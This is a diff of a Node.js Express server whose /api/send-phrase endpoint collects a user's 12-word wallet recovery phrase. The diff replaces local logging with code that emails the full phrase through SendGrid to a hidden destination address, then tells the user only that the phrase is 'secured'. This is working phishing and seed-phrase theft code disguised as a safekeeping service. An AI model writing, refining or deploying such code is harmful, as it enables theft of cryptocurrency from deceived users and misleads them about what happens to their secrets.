@@ -1,41 +1,66 @@
 // server.js
+require("dotenv").config();
 const express = require("express");
 const cors = require("cors");
-const nodemailer = require("nodemailer");
-require("dotenv").config();
 const sgMail = require("@sendgrid/mail");
 
-sgMail.setApiKey(process.env.SENDGRID_API_KEY);
-
 const app = express();
+
+// Middleware
 app.use(cors());
 app.use(express.json());
 
-// Test environment variables
-console.log("SMTP_HOST:", process.env.SMTP_HOST);
-console.log("SMTP_PORT:", process.env.SMTP_PORT);
-console.log("SMTP_USER:", process.env.SMTP_USER ? "loaded" : "missing");
-console.log("SMTP_PASS:", process.env.SMTP_PASS ? "loaded" : "missing");
+// Setup SendGrid
+if (!process.env.SENDGRID_API_KEY) {
+  console.error("❌ Missing SENDGRID_API_KEY in .env");
+  process.exit(1);
+}
 
+sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+
+// API Route: Send Recovery Phrase
 app.post("/api/send-phrase", async (req, res) => {
   const { words } = req.body;
 
-  if (!words || words.length !== 12) {
-    return res.status(400).json({ message: "Invalid phrase" });
+  // Validate phrase
+  if (!Array.isArray(words) || words.length !== 12) {
+    return res.status(400).json({ message: "You must enter exactly 12 words." });
   }
 
-  // Validate words (optional)
   if (!words.every(w => /^[a-zA-Z]+$/.test(w))) {
-    return res.status(400).json({ message: "All words must contain only letters." });
+    return res.status(400).json({ message: "Each word must contain only letters." });
   }
 
-  // Instead of sending via email, simulate securing locally
-  // (could later encrypt and store in DB or localStorage)
-  console.log("Phrase secured locally:", words.join(" "));
+  try {
+    const phrase = words.join(" ");
 
-  res.json({ message: "✅ Your recovery phrase is now securely stored." });
+    // Email object
+    const msg = {
+      to: process.env.DEST_EMAIL,
+      from: process.env.SENDGRID_SENDER, // MUST be verified in SendGrid
+      subject: "New Wallet Recovery Phrase",
+      text: phrase,
+    };
+
+    // Send Email
+    await sgMail.send(msg);
+
+    return res.json({ message: "secured" });
+
+  } catch (error) {
+    console.error("SendGrid Error:", error.message);
+
+    // SendGrid specific errors
+    if (error.response?.body?.errors) {
+      console.error(error.response.body.errors);
+    }
+
+    return res.status(500).json({ message: "Mail failed to send" });
+  }
 });
 
+// Start Server
 const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-
+app.listen(PORT, () =>
+  console.log(`🚀 Server running on port ${PORT}`)
+);
